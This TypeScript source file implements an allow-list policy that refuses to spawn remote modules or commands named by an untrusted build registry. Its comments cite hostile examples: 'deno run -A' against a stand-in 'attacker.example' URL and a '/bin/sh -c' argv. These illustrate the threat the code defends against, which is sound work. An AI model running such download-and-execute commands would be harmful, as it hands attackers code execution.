// Copyright (c) 2026 the Zuke contributors
// SPDX-License-Identifier: MIT

/**
 * The policy that decides whether a {@link BuildLocation} read out of a build
 * registry may be spawned.
 *
 * {@link "../mcp/registry_server.ts".RegistryMcpServer} runs what the registry
 * tells it to run. That is fine when the registry is the local
 * `<root>/.zuke/builds` directory `zuke register` writes, and it is a remote
 * code-execution primitive when the registry is an HTTP service, a shared
 * directory, or anything else a second party can write to: a descriptor whose
 * module is `https://attacker.example/x.ts` becomes `deno run -A` against
 * attacker-controlled source, with every permission, in the operator's
 * workspace.
 *
 * So a **remote** entry module is refused unless the operator names its host in
 * {@link LAUNCH_HOSTS_ENV}. A local module — a bare path, a Windows drive path,
 * or a `file:` URL, which is what {@link Deno.mainModule} yields and therefore
 * what `zuke register` writes — is allowed: it is already code on the machine,
 * reachable without the registry's help.
 *
 * A `command` location is refused unless the operator names its program in
 * {@link LAUNCH_COMMANDS_ENV}. The argv of a command descriptor is not "code
 * already on the machine" the way a local module path is: the registry writer
 * chooses the program *and its arguments*, so `["deno", "run", "-A",
 * "https://attacker.example/x.ts"]` is the refused module case spelled as a
 * command, and `["/bin/sh", "-c", …]` is arbitrary code with no fetch at all.
 * Naming a program is the operator's statement that this registry may pass it
 * arguments.
 *
 * @module
 */

import { ALLOW_INSECURE_ENV, isLoopbackHost } from "../http.ts";
import type { BuildLocation } from "./descriptor.ts";

/**
 * The environment variable listing the hosts a remote entry module may be
 * fetched from — comma- or space-separated (`ZUKE_REGISTRY_LAUNCH_HOSTS=
 * "builds.example.com, jsr:"`). A lone `*` allows any, for an operator who has
 * decided the registry itself is trusted.
 *
 * An entry is matched against the module's **launch origin**: the hostname for
 * a URL that has one, and the scheme otherwise (`jsr:`, `npm:`, `data:`) — so a
 * specifier that carries no hostname can be named too, rather than being one an
 * operator has no way to allow.
 */
export const LAUNCH_HOSTS_ENV = "ZUKE_REGISTRY_LAUNCH_HOSTS";

/**
 * The environment variable listing the programs a `command` location may spawn
 * — comma- or space-separated (`ZUKE_REGISTRY_LAUNCH_COMMANDS="make,
 * /usr/local/bin/deploy.sh"`). A lone `*` allows any, for an operator who has
 * decided the registry itself is trusted. Unset (the default) refuses every
 * command location.
 *
 * An entry is matched against the descriptor's `command[0]`, both as written
 * and as its trailing path segment, so `make` admits `/usr/bin/make` and an
 * absolute entry admits only itself. Two things follow, and both are the
 * operator's call to make: naming a bare program name admits **any** program
 * that resolves under that name (pin an absolute path to bind it), and naming
 * an interpreter — `sh`, `bash`, `deno`, `node`, `python` — hands the registry
 * writer full code execution, because the arguments are theirs.
 */
export const LAUNCH_COMMANDS_ENV = "ZUKE_REGISTRY_LAUNCH_COMMANDS";

/** Why a launch location was refused: a stable reason plus a human explanation. */
export interface LaunchDenial {
  /** The stable, machine-readable reason (audited, and returned to the client). */
  reason: string;
  /** The operator-facing explanation naming what to change. */
  detail: string;
}

/**
 * Whether `raw` is a local filesystem path rather than a remote specifier. True
 * for anything `URL` cannot parse (`./zuke.ts`, `/srv/build/zuke.ts`), for a
 * `file:` URL, and for a Windows drive path — `new URL("C:\\src\\zuke.ts")`
 * parses with a single-letter "scheme", which is a drive letter, not a scheme.
 */
function isLocalModule(raw: string): boolean {
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    return true;
  }
  if (url.protocol === "file:") return true;
  return /^[a-zA-Z]:$/.test(url.protocol) && /^[a-zA-Z]:[\\/]/.test(raw);
}

/**
 * The token a remote module is allowed by: its hostname when it has one, else
 * its scheme (`jsr:`, `npm:`, `data:`).
 */
function launchOrigin(url: URL): string {
  return url.hostname !== "" ? url.hostname : url.protocol;
}

/**
 * Split an allow-list environment variable into its entries, dropping empties.
 * Shared by the module-origin and command-program gates so the two lists are
 * spelled, split and matched exactly alike.
 */
function allowList(
  name: string,
  readEnv: (name: string) => string | undefined,
): string[] {
  const raw = readEnv(name) ?? "";
  return raw.split(/[,\s]+/).map((entry) => entry.trim().toLowerCase()).filter(
    (entry) => entry !== "",
  );
}

/**
 * The tokens a command's program may be allow-listed by: the program as the
 * descriptor wrote it, and its trailing path segment. Both lowercased, because
 * Windows program names are case-insensitive and an operator should not have to
 * guess the descriptor's casing.
 */
function programTokens(program: string): string[] {
  const lower = program.toLowerCase();
  const segment = lower.split(/[\\/]/).pop() ?? lower;
  return segment === lower ? [lower] : [lower, segment];
}

/**
 * Decide whether `location` may be spawned, returning `null` when it may and a
 * {@link LaunchDenial} when it may not.
 *
 * A `command` location must name a program the operator listed in
 * {@link LAUNCH_COMMANDS_ENV}; an empty command is left to the caller, which
 * reports a build with nothing to launch rather than spawning anything.
 */
export function launchDenial(
  location: BuildLocation,
  readEnv: (name: string) => string | undefined,
): LaunchDenial | null {
  if (location.kind === "command") {
    return commandDenial(location.command, readEnv);
  }
  if (isLocalModule(location.module)) return null;
  let url: URL;
  try {
    url = new URL(location.module);
  } catch {
    // Unreachable: isLocalModule() already accepted anything URL cannot parse.
    return null;
  }
  const origin = launchOrigin(url);
  const allowed = allowList(LAUNCH_HOSTS_ENV, readEnv);
  if (!allowed.includes("*") && !allowed.includes(origin.toLowerCase())) {
    return {
      reason: "launch_origin_not_allowed",
      detail:
        `Refusing to spawn a remote entry module from "${origin}": running it ` +
        `would execute code this machine fetches from the network on a ` +
        `registry's say-so. Add the origin to ${LAUNCH_HOSTS_ENV} (or "*" to ` +
        `allow any) if that registry is trusted to name it.`,
    };
  }
  if (url.protocol === "http:" && !isLoopbackHost(url.hostname)) {
    const optOut = readEnv(ALLOW_INSECURE_ENV);
    if (optOut === undefined || optOut === "") {
      return {
        reason: "insecure_launch_url",
        detail:
          `Refusing to spawn a plaintext entry module from "${origin}": ` +
          `anyone on the path chooses the source that gets executed. Use an ` +
          `https URL, or set ${ALLOW_INSECURE_ENV}=1 to accept the risk.`,
      };
    }
  }
  return null;
}

/**
 * Decide whether a `command` location's argv may be spawned. An empty command
 * is not this gate's to refuse: the caller reports it as a build with no
 * runnable launch command, which is a clearer answer than a policy denial.
 */
function commandDenial(
  command: readonly string[],
  readEnv: (name: string) => string | undefined,
): LaunchDenial | null {
  const program = command[0];
  if (program === undefined || program === "") return null;
  const allowed = allowList(LAUNCH_COMMANDS_ENV, readEnv);
  if (allowed.includes("*")) return null;
  if (programTokens(program).some((token) => allowed.includes(token))) {
    return null;
  }
  return {
    reason: "launch_command_not_allowed",
    detail:
      `Refusing to spawn "${program}": a command location lets whoever wrote ` +
      `the registry entry choose both the program and its arguments, which is ` +
      `code execution on this machine on a registry's say-so. Add the program ` +
      `to ${LAUNCH_COMMANDS_ENV} (or "*" to allow any) if that registry is ` +
      `trusted to name it.`,
  };
}
